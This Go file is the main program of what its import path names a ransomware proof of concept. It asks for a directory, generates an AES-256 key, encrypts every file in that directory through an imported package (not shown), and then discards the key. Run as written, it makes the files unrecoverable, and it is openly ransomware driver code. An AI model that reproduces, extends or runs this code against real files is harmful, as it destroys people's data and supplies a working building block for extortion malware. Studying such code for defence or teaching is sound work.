package main

import (
	"fmt"
	"github.com/arviiyer/ransomware-poc/encryption" // Import your encryption package
)

func getUserInput() string {
	var dirPath string
	fmt.Print("Enter directory path: ")
	fmt.Scanln(&dirPath)
	fmt.Println("Entered directory path: ", dirPath)
	return dirPath
}

func main() {
	// Get the directory from the user
	dirPath := getUserInput()

	// Generate an AES-256 encryption key
	key := encryption.GenerateAESKey()

	// Encrypt all files in the directory
	err := encryption.EncryptFilesInDirectory(dirPath, key)
	if err != nil {
		fmt.Println("Error encrypting files in the directory:", err)
	} else {
		fmt.Println("All files in the directory were encrypted successfully!")
	}
}

